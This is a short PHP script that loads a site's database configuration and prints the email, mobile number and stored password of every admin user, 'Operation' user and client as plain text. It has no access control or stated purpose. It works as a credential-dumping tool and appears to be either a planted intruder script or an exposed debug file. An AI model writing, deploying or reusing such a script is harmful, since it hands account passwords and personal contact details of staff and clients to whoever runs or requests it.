<?php
require_once('include/config.php');

echo "--- ADMIN USERS ---\n";
$q1 = mysqli_query($conn, "SELECT email, mobile, password, role FROM tblusers WHERE role='Admin' OR role='Admin '");
while ($r = mysqli_fetch_assoc($q1)) {
    echo "Email: " . $r['email'] . ", Mobile: " . $r['mobile'] . ", Pass: " . $r['password'] . "\n";
}

echo "\n--- OPERATION USERS ---\n";
$q2 = mysqli_query($conn, "SELECT email, mobile, password, role FROM tblusers WHERE role='Operation'");
if ($q2) {
    while ($r = mysqli_fetch_assoc($q2)) {
        echo "Email: " . $r['email'] . ", Mobile: " . $r['mobile'] . ", Pass: " . $r['password'] . "\n";
    }
}

echo "\n--- CLIENTS ---\n";
$q3 = mysqli_query($conn, "SELECT contact_email, contact_mobile, password FROM clients");
if ($q3) {
    while ($r = mysqli_fetch_assoc($q3)) {
        echo "Email: " . $r['contact_email'] . ", Mobile: " . $r['contact_mobile'] . ", Pass: " . $r['password'] . "\n";
    }
}
?>
